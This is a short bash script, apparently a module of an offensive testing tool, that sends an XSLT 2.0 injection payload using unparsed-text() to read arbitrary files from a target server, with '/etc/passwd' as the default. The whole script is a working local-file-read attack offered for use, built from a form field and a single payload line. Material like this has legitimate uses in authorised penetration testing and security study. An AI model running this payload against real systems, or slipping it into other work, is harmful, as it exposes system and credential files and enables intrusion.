#!/bin/bash

: '
XSLT - lfi dump file (only works in version 2.0)
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
FILE_FIELD=$(form_item "read file" "file" "/etc/passwd")

# Generate GUI form
generate_form "${FILE_FIELD}"

FILE=${form_data["file"]}

execute_command "<xsl:value-of select=\"unparsed-text('${FILE}', 'utf-8')\" />"
